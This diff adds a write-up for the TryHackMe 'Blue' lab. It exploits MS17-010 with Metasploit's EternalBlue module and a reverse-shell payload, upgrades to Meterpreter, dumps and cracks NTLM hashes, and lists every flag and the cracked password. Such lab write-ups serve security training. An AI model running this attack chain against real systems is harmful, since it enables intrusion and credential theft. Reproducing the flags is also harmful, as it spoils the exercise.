@@ -1,0 +1,301 @@
+================================================================================
+Blue CTF - Technical Solution Guide
+https://tryhackme.com/room/blue
+================================================================================
+
+OBJECTIVE: Deploy & hack into a Windows machine, leveraging common misconfigurations
+DIFFICULTY: Easy
+KEYWORDS: EternalBlue, MS17-010, SMBv1, Metasploit, Hash Cracking
+TARGET IP: 10.49.162.101
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Full service scan
+nmap -sV -sC -Pn -T4 10.49.162.101
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-15 07:52 -0400
+Nmap scan report for 10.49.162.101
+Host is up (0.20s latency).
+Not shown: 992 closed tcp ports (reset)
+
+Open Ports (under 1000):
+  135/tcp - msrpc        (Microsoft Windows RPC)
+  139/tcp - netbios-ssn  (Microsoft Windows netbios-ssn)
+  445/tcp - microsoft-ds (Windows 7 Professional 7601 Service Pack 1)
+
+Answer - Ports open under 1000: 3
+
+# Vulnerability scan on discovered ports
+nmap -p 135,139,445 --script=vuln 10.49.162.101
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-15 07:56 -0400
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.techtech.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+
+Answer - Vulnerability: ms17-010
+
+================================================================================
+[2] GAIN ACCESS
+================================================================================
+
+# Search for the exploit module in Metasploit
+msf > search ms17-010
+
+Answer - Exploit path: exploit/windows/smb/ms17_010_eternalblue
+
+# Load and configure the exploit
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Answer - Required option: RHOSTS
+
+# Set required options before running
+set RHOSTS 10.49.162.101
+set payload windows/x64/shell/reverse_tcp
+set LHOST tun0
+
+# Execute the exploit
+run
+
+================================================================================
+[3] ESCALATE
+================================================================================
+
+# Background the current shell with CTRL + Z
+# Search for the shell-to-meterpreter upgrade module
+msf exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
+
+Answer - Post module: post/multi/manage/shell_to_meterpreter
+
+# Load the module and show options
+use post/multi/manage/shell_to_meterpreter
+show options
+
+Answer - Required option: SESSION
+
+# List active sessions and upgrade
+sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                               Connection
+  --  ----  ----               -----------                               ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version  192.168.140.216:4444 -> 10.49.162.101:492
+                                6.1.7601] -----
+
+set SESSION 1
+run
+
+# Switch to the new Meterpreter session
+msf post(multi/manage/shell_to_meterpreter) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter >
+
+# Verify privilege level
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > getpid
+Current pid: 1092
+
+# Confirm SYSTEM-level process in process list
+meterpreter > ps
+
+ 1092  2524  powershell.exe  x64  0  NT AUTHORITY\SYSTEM  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+================================================================================
+[4] CRACKING
+================================================================================
+
+# Dump all local password hashes
+meterpreter > hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+Answer - Non-default user: Jon
+Hash to crack: ffb43f0de35be4d9917ac0cc8ad57f8d
+
+# Save the hash and crack with John the Ripper
+echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
+john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=6
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (?)
+
+Answer - Cracked password: alqfna22
+
+================================================================================
+[5] FIND FLAGS
+================================================================================
+
+# Search for all flag files on the system
+meterpreter > search -f flag*
+Found 6 results...
+
+Path                                                                    Size (bytes)
+----                                                                    ------------
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk         482
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk         848
+c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk         2344
+c:\Users\Jon\Documents\flag3.txt                                         37
+c:\Windows\System32\config\flag2.txt                                     34
+c:\flag1.txt                                                             24
+
+--------------------------------------------------------------------------------
+Flag 1 - System Root
+--------------------------------------------------------------------------------
+
+Hint: Flag can be found at the system root.
+Location: c:\flag1.txt
+
+meterpreter > cat c:\\flag1.txt
+
+Answer: flag{access_the_machine}
+
+--------------------------------------------------------------------------------
+Flag 2 - Password Storage (SAM Database)
+--------------------------------------------------------------------------------
+
+Hint: Flag can be found at the location where passwords are stored within Windows.
+Location: c:\Windows\System32\config\flag2.txt
+
+meterpreter > cat c:\\Windows\\System32\\config\\flag2.txt
+
+Answer: flag{sam_database_elevated_access}
+
+--------------------------------------------------------------------------------
+Flag 3 - Administrator Documents
+--------------------------------------------------------------------------------
+
+Hint: Flag can be found in an excellent location to loot.
+Location: c:\Users\Jon\Documents\flag3.txt
+
+meterpreter > cat c:\\Users\\Jon\\Documents\\flag3.txt
+
+Answer: flag{admin_documents_can_be_valuable}
+
+================================================================================
+[6] FLAGS SUMMARY
+================================================================================
+
+Flag 1 : flag{access_the_machine}             -> c:\flag1.txt
+Flag 2 : flag{sam_database_elevated_access}   -> c:\Windows\System32\config\flag2.txt
+Flag 3 : flag{admin_documents_can_be_valuable}-> c:\Users\Jon\Documents\flag3.txt
+
+================================================================================
+[7] VULNERABILITY ANALYSIS
+================================================================================
+
+CVE          : CVE-2017-0143
+Bulletin     : MS17-010
+Component    : Microsoft SMBv1
+Risk         : CRITICAL — Unauthenticated Remote Code Execution
+Disclosure   : 2017-03-14
+
+Description:
+  A critical remote code execution flaw exists in the way Microsoft SMBv1
+  handles certain requests. An unauthenticated attacker can exploit this
+  vulnerability by sending specially crafted packets to TCP port 445,
+  resulting in arbitrary code execution with SYSTEM privileges.
+
+Contributing factors on this machine:
+  1. SMBv1 enabled and exposed
+  2. Windows 7 SP1 — end-of-life, no security updates since Jan 2020
+  3. MS17-010 patch not applied
+  4. Weak local user password crackable via dictionary attack
+
+================================================================================
+[8] TOOLS USED
+================================================================================
+
+Reconnaissance:
+- Nmap 7.99          : Port scanning and vulnerability detection (--script=vuln)
+
+Exploitation:
+- Metasploit Framework : ms17_010_eternalblue exploit module
+- Meterpreter          : Post-exploitation shell with hashdump capability
+
+Post-Exploitation:
+- John the Ripper    : NTLM hash cracking with rockyou.txt wordlist
+
+================================================================================
+[9] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap port scan → 3 open SMB-related ports identified
+    ↓
+Nmap vuln script → MS17-010 (EternalBlue) confirmed
+    ↓
+Metasploit search → exploit/windows/smb/ms17_010_eternalblue
+    ↓
+RHOSTS configured → exploit executed
+    ↓
+Reverse TCP shell established
+    ↓
+CTRL+Z → shell backgrounded
+    ↓
+post/multi/manage/shell_to_meterpreter → SESSION 1 upgraded
+    ↓
+Meterpreter session 2 opened
+    ↓
+getuid → NT AUTHORITY\SYSTEM confirmed
+    ↓
+hashdump → NTLM hashes extracted
+    ↓
+Non-default user: Jon | Hash: ffb43f0de35be4d9917ac0cc8ad57f8d
+    ↓
+John the Ripper (NT format, rockyou.txt) → alqfna22
+    ↓
+search -f flag* → 3 flag locations identified
+    ↓
+Flag 1: flag{access_the_machine}
+    ↓
+Flag 2: flag{sam_database_elevated_access}
+    ↓
+Flag 3: flag{admin_documents_can_be_valuable}
+    ↓
+Complete system compromise
+
+================================================================================
+[10] REFERENCES
+================================================================================
+
+TryHackMe:
+- Blue Room: https://tryhackme.com/room/blue
+
+Microsoft:
+- Security Bulletin MS17-010: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+- WannaCrypt Customer Guidance: https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+CVE:
+- CVE-2017-0143: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Tools:
+- Nmap:       https://nmap.org/
+- Metasploit: https://www.metasploit.com/
+- John:       https://www.openwall.com/john/
+
+================================================================================
